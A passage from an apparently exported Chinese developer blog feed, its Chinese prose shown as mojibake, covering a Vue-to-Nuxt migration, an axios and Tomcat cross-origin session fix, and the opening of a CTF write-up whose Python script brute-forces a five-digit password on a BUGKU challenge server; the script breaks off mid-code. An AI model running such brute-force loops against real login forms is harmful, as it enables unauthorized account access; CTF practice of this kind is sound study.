<p>ç¡®å®šä»¥åï¼Œå°±å¯ä»¥ä¸Šæ‰‹äº†ï¼Œæˆ‘ä¹‹å‰ç¼–å†™çš„ä»£ç ä¸­ï¼Œå¾ˆå¤šé¡µé¢çš„è¯·æ±‚æ•°æ®éƒ½æ˜¯æ”¾åœ¨<code>created()</code>å‡½æ•°ä¸­ï¼Œä½†æ˜¯åœ¨<code>Nuxt</code>æ¡†æ¶ä¸‹ï¼Œè¯¥å‡½æ•°ä¼šåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å„æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™ä¸æ˜¯æˆ‘æƒ³è¦çš„ï¼Œå› æ­¤ä¸»è¦å·¥ä½œæ˜¯å°†è¯·æ±‚æ•°æ®çš„ä»£ç æ”¾åœ¨äº†<code>asyncData()</code>å‡½æ•°ä¸­ã€‚</p>
<p>è¿˜å¥½æˆ‘ä¹‹å‰å†™çš„å‰ç«¯éƒ½æ˜¯æŒ‰ç…§æ¨¡å—åŒ–å¼€å‘ï¼Œå¾ˆå¤šåŠŸèƒ½éƒ½æ˜¯æŒ‰ç…§ç»„ä»¶æ¥è¿›è¡Œå¼€å‘ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œæ”¹é€ èµ·æ¥å°±å¿«å¾ˆå¤šäº†ã€‚</p>
<p>è¿˜å¥½æˆ‘ä¹‹å‰ä½¿ç”¨çš„æ˜¯å‰åç«¯åˆ†ç¦»æ¨¡å¼ï¼Œåç«¯å°±åªéœ€è¦æä¾›æ¥å£ï¼Œæ”¹é€ èµ·æ¥ï¼Œåç«¯ä¸€è¡Œä»£ç ä¹Ÿä¸éœ€è¦æ›´æ”¹ã€‚</p>
<h2 id="é‡åˆ°çš„å‘"><a href="#é‡åˆ°çš„å‘" class="headerlink" title="é‡åˆ°çš„å‘"></a>é‡åˆ°çš„å‘</h2><p>è™½ç„¶æ”¹é€ èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯æœ‰äº›ä»£ç ä¹Ÿå¹¶ä¸æ˜¯ä¸€å¸†é£é¡ºï¼Œä¹Ÿåˆ°äº†å¾ˆå¤šå‘ï¼Œè¿˜å¥½è‡ªå·±æˆ–å¤šæˆ–å°‘æ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆã€‚</p>
<ul>
<li><p>é”™è¯¯ä¸€ï¼šåœ°å€æ åˆ·æ–°<code>/home</code>çš„æ—¶å€™ï¼Œåå°æ§åˆ¶å°æŠ¥<code>status</code> æœªå®šä¹‰ï¼Œä½†æ˜¯åˆ·æ–°</p>
<p><code>/</code>æ˜¯å¯ä»¥çš„ï¼ˆæˆ‘çš„ä¹‹å‰ä»£ç é€»è¾‘æ˜¯ï¼šè¾“å…¥<code>/</code>æ—¶å€™ï¼Œè·¯ç”±ç›´æ¥è·³è½¬åˆ°<code>/home</code>ï¼‰</p>
<p>è§£å†³æ–¹æ¡ˆï¼šè®¾ç½®è·¨åŸŸä»£ç†ï¼Œå³å…ˆå®‰è£…å¥½<code>axios</code>:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install @nuxtjs/axios -s</span><br></pre></td></tr></table></figure>

<p>æ¥ç€åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹ä¸­<code>plugins</code>ä¸­æ–°å»º<code>axios.js</code>æ–‡ä»¶ï¼Œè¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> &#123; Message &#125; <span class="keyword">from</span> <span class="string">"element-ui"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; MessageBox &#125; <span class="keyword">from</span> <span class="string">"element-ui"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params">&#123;store, route, redirect, $axios,req&#125;</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Erroræ‹¦æˆªå™¨ï¼šå‡ºç°é”™è¯¯çš„æ—¶å€™è¢«è°ƒç”¨ï¼Œæ ¹æ®çŠ¶æ€ç åšå¯¹åº”åˆ¤æ–­å¹¶æ˜¾ç¤ºå…¨å±€Message</span></span><br><span class="line">    $axios.onError(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// console.log('erro statusr =', error.response.status);</span></span><br><span class="line">      <span class="keyword">switch</span> (<span class="built_in">parseInt</span>(error.response.status)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">400</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'å‘é€æ•°æ®é”™è¯¯'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">        &#125;);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">402</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'æ±Ÿæ¹–ä¸­æŸ¥æ— æ­¤äººï¼'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">        &#125;);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">          <span class="comment">// å¯†ç é”™è¯¯</span></span><br><span class="line">				<span class="keyword">case</span> <span class="number">403</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'å¯†ä»¤é”™è¯¯ï¼'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">				&#125;);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// å¯†ç é”™è¯¯</span></span><br><span class="line">				<span class="keyword">case</span> <span class="number">405</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'å£ä»¤é”™è¯¯ï¼'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">				&#125;);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">480</span>: <span class="comment">// æœªç™»å½•</span></span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'480!!'</span>);</span><br><span class="line">          redirect(redirectURL(route,req))</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">500</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'åç«¯å‡ºé”™'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">				&#125;); <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// Responseæ‹¦æˆªå™¨ï¼šå¯¹æ­£å¸¸è¿”å›çš„æ•°æ®è¿›è¡Œå¤„ç†</span></span><br><span class="line">    $axios.onResponse(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> response.data </span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–é‡å®šå‘åœ°å€</span></span><br><span class="line"><span class="keyword">const</span> redirectURL = <span class="function">(<span class="params">route,req</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// å®¢æˆ·ç«¯</span></span><br><span class="line">  <span class="keyword">if</span>(process.client) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'/admin/login'</span></span><br><span class="line">  &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'/admin/login'</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>nuxt.config.js</code>ä¸­é…ç½®<code>axios</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> plugins: [</span><br><span class="line">   &#123;</span><br><span class="line">     src: <span class="string">'~/plugins/axios'</span>,</span><br><span class="line">     <span class="string">'ssr'</span>: <span class="literal">true</span> <span class="comment">// æœåŠ¡ç«¯æ¸²æŸ“</span></span><br><span class="line">  &#125;,</span><br><span class="line"> buildModules: [</span><br><span class="line">   <span class="string">'@nuxtjs/axios'</span>,</span><br><span class="line"> ],</span><br><span class="line"> modules: [</span><br><span class="line">   <span class="string">'@nuxtjs/axios'</span>,</span><br><span class="line">   <span class="string">'@nuxtjs/proxy'</span>,</span><br><span class="line"> ],</span><br><span class="line"> axios: &#123;</span><br><span class="line">   <span class="comment">// Workaround to avoid enforcing hard-coded localhost:3000: https://github.com/nuxt-community/axios-module/issues/308</span></span><br><span class="line">   proxy: <span class="literal">true</span>, <span class="comment">// å¼€å¯è·¨åŸŸè¡Œä¸º</span></span><br><span class="line">   prefix: <span class="string">'/api'</span>, <span class="comment">// é…ç½®åŸºæœ¬å¾—urlåœ°å€</span></span><br><span class="line">   credentials: <span class="literal">true</span></span><br><span class="line"> &#125;,</span><br><span class="line">     <span class="comment">// é…ç½®ä»£ç†</span></span><br><span class="line"> proxy: &#123;</span><br><span class="line">   <span class="string">'/api'</span>: &#123;</span><br><span class="line">       target: <span class="string">'http://localhost:8080/api/'</span>,</span><br><span class="line">       ws: <span class="literal">false</span>,</span><br><span class="line">       changeOrigin: <span class="literal">true</span>,</span><br><span class="line">       pathRewrite: &#123;</span><br><span class="line">           <span class="string">'^/api'</span>: <span class="string">''</span>,</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
</li>
<li><p>æˆ‘çš„é¡¹ç›®ä¸­ç”¨äº†<code>echarts</code>ï¼Œä½†æ˜¯æˆ‘å°±ä»…ä»…ç”¨æ¥çƒ­åŠ›å›¾ç»„ä»¶ï¼Œä¸æƒ³æŠŠæ•´ä¸ª<code>echarts</code>é¡¹ç›®å®‰è£…è¿›æˆ‘çš„é¡¹ç›®ï¼Œå°±æƒ³ç€æ€ä¹ˆæŒ‰éœ€å¼•å…¥ã€‚åæ¥åœ¨æŸä¸ªåœ°æ–¹æ‰¾åˆ°å®˜æ–¹å®šåˆ¶çš„<a href="https://echarts.apache.org/zh/builder.html" target="_blank" rel="noopener">ç½‘ç«™</a>ï¼Œåœ¨ä¸Šé¢çš„ç½‘ç«™é€‰åç»„ä»¶ä»¥åï¼Œç›´æ¥ä¸‹è½½<code>js</code>æ–‡ä»¶ï¼Œç„¶åå°±æŒ‰ç…§æ–‡æ¡£æ•™ç¨‹ï¼Œåœ¨éœ€è¦å¼•å…¥çš„åœ°æ–¹å¼•å…¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// .vue æ–‡ä»¶ä¸­ï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> echarts <span class="keyword">from</span> <span class="string">"~/assets/js/echarts.min.js"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">    mounted()&#123;</span><br><span class="line">        echarts.init(...);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>æœ‰çš„æ—¶å€™<code>node</code>æœåŠ¡ç«¯æŠ¥<code>window is not defined</code></p>
<p>è§£å†³æ–¹æ¡ˆï¼šæœ‰äº›ä»£ç ä¼šåœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¸­éƒ½æ‰§è¡Œä¸€éï¼Œä½†æ˜¯åœ¨æœåŠ¡ç«¯ä¸­ï¼Œæ˜¯æ²¡æœ‰<code>window</code>è¿™ä¸ªå¯¹è±¡çš„ï¼Œå› æ­¤è¦åœ¨ä»£ç ä¸­åŠ ä¸€ä¸ªåˆ¤æ–­æ˜¯åœ¨å“ªä¸ªç«¯çš„è¯­å¥ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¦‚æœæ˜¯å®¢æˆ·ç«¯</span></span><br><span class="line"> <span class="keyword">if</span> (process.client) &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>åœ¨ç»„ä»¶ä¸­å¼•ç”¨è‡ªå®šä¹‰çš„<code>css</code>æ–‡ä»¶æ€»æ˜¯å¤±æ•ˆã€‚</p>
<p>è§£å†³æ–¹æ³•ï¼šåŸå…ˆæŒ‰ç…§<code>vue</code>çš„æ–¹å¼ï¼Œå¼•ç”¨æ–¹å¼ä¸ºï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">import</span> <span class="string">"~/assets/css/blog.css"</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ–¹æ³•ä¼¼ä¹åœ¨<code>Nuxt</code>æ¡†æ¶ä¸‹ä¸è¡Œï¼Œè¦æ¢æˆä»¥ä¸‹æ–¹å¼å¼•ç”¨ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">        head()&#123;</span><br><span class="line"><span class="actionscript">    		<span class="keyword">return</span>&#123;</span></span><br><span class="line">      			link: [</span><br><span class="line"><span class="javascript">        			&#123;<span class="attr">rel</span>: <span class="string">'stylesheet'</span>, <span class="attr">href</span>: 									<span class="built_in">require</span>(<span class="string">'~/assets/css/blog.css'</span>)&#125;</span></span><br><span class="line">      			]</span><br><span class="line">    		&#125;</span><br><span class="line">  		&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»å¾—æ¥è¯´ï¼Œæ”¹é€ èµ·æ¥å›°éš¾ä¸æ˜¯å¾ˆå¤§ï¼ŒåŠ ä¸Š<code>vue</code>çš„ç”Ÿæ€çš„ç¡®å¾ˆå¥½ï¼Œå¾ˆå¤šé—®é¢˜éƒ½å¯ä»¥æ‰¾å¾—åˆ°è§£å†³æ–¹æ¡ˆï¼Œç›®å‰æ”¹é€ åçš„ç³»ç»Ÿï¼š</p>
</li>
<li><input checked disabled type="checkbox"> <p>æ”¯æŒé¡µé¢åŠ¨ç”»ï¼Œæ”¹å–„ç”¨æˆ·ä½“éªŒ</p>
</li>
<li><input checked disabled type="checkbox"> <p>å…¨ç«™çš„ç«™å†…é“¾æ¥å‡ä½¿ç”¨<code>nuxt-link</code>æ–¹å¼ï¼ŒåŠ å¿«é¡µé¢åˆ‡æ¢ä»¥åŠé¿å…ç›¸åŒè·¯ç”±åˆ‡æ¢æ—¶æŠ¥é”™ï¼Œè€Œä¸”è¿˜æœ‰åˆ©äº<code>SEO</code></p>
</li>
<li><input checked disabled type="checkbox"> <p>åå°ç™»é™†æ”¯æŒéªŒè¯ç ï¼Œå¢åŠ å®‰å…¨æ€§ï¼Œä¹‹å‰çš„æ˜¯è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ä»¥åå°±å¯ä»¥ç™»å½•äº†ï¼Œå®‰å…¨æ€§ä¸æ˜¯å¾ˆå¤§ï¼ˆ==è™½ç„¶éªŒè¯ç ä¹Ÿæ²¡æœ‰åŠ å¤šå°‘å®‰å…¨æ€§==ï¼‰</p>
</li>
<li><input checked disabled type="checkbox"> <p>åå°markdownè§£æå¢åŠ é«˜äº®è¯­æ³•ã€åˆ é™¤çº¿è¯­æ³•ï¼Œ<del>å°±æ˜¯è¿™æ ·å­</del>ï¼Œè¿™ä¸ªæ’ä»¶å®˜æ–¹æ²¡æœ‰ï¼Œåº”è¯¥æ˜¯å¤ªç®€å•åšäº†ï¼Œæˆ‘å¯¹ç…§ç€åŸæœ‰çš„æ’ä»¶å°±åšå‡ºæ¥äº†ã€‚</p>
</li>
<li><input checked disabled type="checkbox"> <p>æ”¯æŒå…¬å¼ï¼šå¦‚è¿™æ˜¯è¥¿å¡”$\theta$,ä¸‹é¢æ˜¯å…¬å¼<br>$$<br>y=\sum_{i=0}^{n}x_i<br>$$</p>
</li>
<li></li>
</ul>
<p>æœªæ¥<strong>å¯èƒ½</strong>è¿›ä¸€æ­¥å®Œå–„çš„æ–¹å‘ï¼š</p>
<ul>
<li><input disabled type="checkbox"> æ¢å¤æ–‡ç« ä¸‹çš„è¯„è®ºç»„ä»¶ï¼Œä¸ºä»€ä¹ˆå«æ¢å¤å‘¢ï¼Œå› ä¸ºä¹‹å‰çš„æ˜¯æ”¯æŒçš„ï¼Œä½†æ˜¯æˆ‘æ”¹é€ ä»¥åï¼Œå›å¤æŒ‰é’®çš„ç»‘å®šäº‹ä»¶ä¸€ç›´ä¸è§¦å‘ï¼Œå½“æ—¶è°ƒäº†ä¸€å¤©éƒ½æ²¡æœ‰è°ƒå‡ºæ¥ï¼Œè°ƒåˆ°è‡ªé—­ã€‚</li>
<li><input disabled type="checkbox"> æ”¯æŒå¤œé—´æ¨¡å¼ï¼Œè¿™ä¸ªå¥½åƒæŒºéš¾çš„ï¼Œä¸å¥½å®ç°ï¼Œæœ‰å¯èƒ½æœ€ç»ˆä¸å®ç°äº†ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆã€‚</li>
</ul>
]]></content>
      <categories>
        <category>åšå®¢</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Nuxt</tag>
        <tag>å‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨axios+tomcat HttpServletå¤„ç†è·¨åŸŸè¯·æ±‚ä»¥åŠå¤„ç†cookie</title>
    <url>/2020/12/17/%E4%BD%BF%E7%94%A8axios-tomcat-HttpServlet%E5%A4%84%E7%90%86%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E4%BB%A5%E5%8F%8A%E5%A4%84%E7%90%86cookie/</url>
    <content><![CDATA[<h2 id="å‰å› "><a href="#å‰å› " class="headerlink" title="å‰å› "></a>å‰å› </h2><p>æœ‰ä¸€ä¸ªéœ€æ±‚ï¼Œå‰ç«¯é€šè¿‡<code>axios</code>å‘é€ç”¨æˆ·åå’Œå¯†ç åˆ°åå°ï¼Œåå°æŸ¥è¯¢æ•°æ®åº“åï¼Œç¡®è®¤åˆæ³•ç”¨æˆ·åç›´æ¥æŠŠä¿¡æ¯å­˜è¿›<code>session</code>é‡Œè¾¹ï¼Œè€Œä¸ºäº†å®ç°è¿™ä¸ª éœ€æ±‚ï¼Œå°±éœ€è¦å‰ç«¯è§£å†³è·¨åŸŸï¼Œå¹¶ä¸”å°†cookieå­˜åˆ°æœ¬åœ°è®¡ç®—æœºä¸­ã€‚<a id="more"></a></p>
<h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>é¦–å…ˆæ˜¯é€šè¿‡ä»£ç†å®ç°è·¨åŸŸè¯·æ±‚ï¼šå‰ç«¯å‘é€<code>url:http://localhost:8081/beforeLogin</code>ï¼Œè®¿é—®åˆ°<code>http://localhost:8080/testJson4servlet/beforeLogin</code></p>
<p>å‚ç…§å¹¿å¤§ç½‘å‹çš„æ­¥éª¤ï¼šåœ¨å’Œ<code>package.json</code>åŒçº§ç›®å½•ä¸‹æ–°å»ºé…ç½®æ–‡ä»¶<code>vue.config.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line"></span><br><span class="line">    devServer: &#123;</span><br><span class="line">        port: <span class="number">8081</span>,</span><br><span class="line">        proxy: &#123;</span><br><span class="line">            <span class="string">'/api'</span>: &#123;</span><br><span class="line"></span><br><span class="line">                target: <span class="string">'http://localhost:8080/testJson4servlet/'</span>,</span><br><span class="line">                ws: <span class="literal">false</span>,</span><br><span class="line">                changeOrigin: <span class="literal">true</span>,</span><br><span class="line">                pathRewrite: &#123;</span><br><span class="line">                    <span class="string">'^/api'</span>: <span class="string">''</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        disableHostCheck: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>main.js</code>ä¸­é…ç½®å…¨å±€<code>axios</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line">Vue.use(ElementUI);</span><br><span class="line"></span><br><span class="line">Vue.prototype.$axios = Axios;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line">Axios.defaults.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>åœ¨éœ€è¦å‘é€è¯·æ±‚çš„åœ°æ–¹åŠ ä¸Šå‰ç¼€urlï¼šâ€apiâ€</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$axios.get(<span class="string">"/api/beforeLogin"</span>).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<hr>
<p>è¿™æ ·å­è™½ç„¶èƒ½å¤Ÿå‘é€è¯·æ±‚ï¼Œåå°ä¹Ÿèƒ½å¤Ÿæ¥å—æ•°æ®ï¼Œä½†æ˜¯ï¼ï¼ï¼ï¼Œæ¯æ¬¡å‘é€çš„sessionIDéƒ½ä¸ä¸€æ ·ï¼Œè¿™æ ·å­æ— æ³•è¿›è¡Œç™»é™†éªŒè¯ï¼ˆä½ ä¼šå‘ç°æ¯æ¬¡ç™»é™†åï¼Œä¸‹æ¬¡è¿˜è¦ç™»é™†ï¼‰ï¼Œåœ¨æµè§ˆå™¨é‡Œè¾¹æ‰“å¼€å®¡æŸ¥å…ƒç´ ä¹Ÿçœ‹ä¸åˆ°Cookieï¼Œä½†æ˜¯åœ¨å“åº”å¤´Response headersé‡Œè¾¹çœ‹åˆ°äº†set-cookieï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set-cookie: JSESSIONID&#x3D;DFBEA9837130E7DA23723674A2B3EFE9; Path&#x3D;&#x2F;testJson4servlet; HttpOnly</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°åé¢çš„è¿™ä¸ª<code>testJson4servlet</code>ï¼Œè¿™ä¸ªåœ°å€åˆšå¥½æ˜¯æˆ‘åå°<code>tomcat</code>çš„é¡¹ç›®åœ°å€ã€‚</p>
<p>ç”±äºæˆ‘ä»¬å‰é¢ä½¿ç”¨ä»£ç†çš„æ—¶å€™è®¾ç½®äº†rulå‰ç¼€ä¸ºapiï¼Œå¯¼è‡´è¿™é‡Œå¯¹åº”ä¸ä¸Šï¼Œå› æ­¤éœ€è¦åœ¨<code>vue.config.js</code>æ”¹æˆ‘ä»¬çš„å‰ç¼€<code>url</code>ä¸ºæˆ‘ä»¬çš„é¡¹ç›®åœ°å€</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line"></span><br><span class="line">    devServer: &#123;</span><br><span class="line">        port: <span class="number">8081</span>,</span><br><span class="line">        proxy: &#123;</span><br><span class="line">            <span class="string">'/testJson4servlet'</span>: &#123;</span><br><span class="line"></span><br><span class="line">                target: <span class="string">'http://localhost:8080/testJson4servlet/'</span>,</span><br><span class="line">                ws: <span class="literal">false</span>,</span><br><span class="line">                changeOrigin: <span class="literal">true</span>,</span><br><span class="line">                pathRewrite: &#123;</span><br><span class="line">                    <span class="string">'^/testJson4servlet'</span>: <span class="string">''</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        disableHostCheck: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯·æ±‚ä»£ç ç›¸åº”åœ°è¿›è¡Œä¿®æ”¹</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$axios.get(<span class="string">"/api/beforeLogin"</span>).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>åå°æ‰“å°çš„sessionIdç»ˆäºçŸ­æ—¶é—´å†…ä¸ä¼šæ”¹å˜äº†ï¼ï¼ï¼:D</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vueåˆçº§</category>
      </categories>
      <tags>
        <tag>Cookie</tag>
        <tag>Vue</tag>
        <tag>axios</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨pythonå¤šçº¿ç¨‹çˆ†ç ´æ•°å­—å¯†ç </title>
    <url>/2022/05/14/%E4%BD%BF%E7%94%A8python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%86%E7%A0%B4%E6%95%B0%E5%AD%97%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¯´èµ·ç½‘ç»œå¯†ç çˆ†ç ´ï¼Œæˆ‘ä»¬å¯èƒ½ç¬¬ä¸€æ—¶é—´æƒ³åˆ°å¤§åé¼é¼çš„è½¯ä»¶<code>Burp Suite</code>ï¼Œè¯¥è½¯ä»¶å¯ä»¥æ–¹ä¾¿åœ°è¿›è¡Œç½‘ç»œä»£ç†ï¼Œæ•°æ®æˆªåŒ…ã€æ”¹åŒ…ï¼Œå¯†ç çˆ†ç ´ï¼Œä½†æ˜¯å¯†ç çˆ†ç ´æ•ˆç‡å®åœ¨æ˜¯å¤ªä½ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“å¯†ç çš„ç±»å‹ï¼Œä¾‹å¦‚æ˜¯çº¯æ•°å­—çš„å¯†ç ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°†å¯†ç è¿›è¡Œåˆ†æ®µï¼Œä¸åŒçš„èŒƒå›´ä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œçˆ†ç ´ï¼Œåˆ©ç”¨å¹¶å‘è¿›è¡ŒèŠ‚çœæ—¶é—´ã€‚</p>
<a id="more"></a>

<h2 id="é¢˜ç›®èƒŒæ™¯"><a href="#é¢˜ç›®èƒŒæ™¯" class="headerlink" title="é¢˜ç›®èƒŒæ™¯"></a>é¢˜ç›®èƒŒæ™¯</h2><p><code>BUGKU</code>çš„<a href="https://ctf.bugku.com/challenges/detail/id/82.html" target="_blank" rel="noopener">ã€Šå¥½åƒéœ€è¦å¯†ç ã€‹</a></p>
<p>æ‰“å¼€é¢˜ç›®åï¼Œæˆ‘ä»¬å‘ç°åªéœ€è¦æäº¤ä¸€ä¸ªå¯†ç çš„è¡¨å•å³å¯ï¼Œè€Œä¸”çŸ¥é“äº†æ˜¯<code>5</code>ä½æ•°å­—ï¼Œå³<code>00000</code>-<code>99999</code>ã€‚</p>
<p>åˆ†æäº†èŒƒå›´ä»¥åï¼Œæ¥ä¸‹æ¥å°±æ˜¯å°†å¯†ç åˆ†æ®µï¼Œç„¶åå¼€å¯ä¸€ä¸ªä¸ªçº¿ç¨‹æ‰§è¡Œçˆ†ç ´ç¨‹åºï¼Œè¯¦ç»†å¦‚ä»£ç æ‰€ç¤ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°è¯•çˆ†ç ´ [start, end] åŒºé—´çš„å¯†ç </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(name, start, end)</span>:</span></span><br><span class="line">    print(<span class="string">'thread %s start! %s ---&gt; %s'</span> % (name, start, end))</span><br><span class="line">    pas = start</span><br><span class="line">    <span class="keyword">while</span> pas &lt;= end:</span><br><span class="line">        test = requests.post(<span class="string">'http://114.67.175.224:15120'</span>, data=&#123;<span class="string">'pwd'</span>: pas&#125;)</span><br><span class="line">        <span class="comment"># 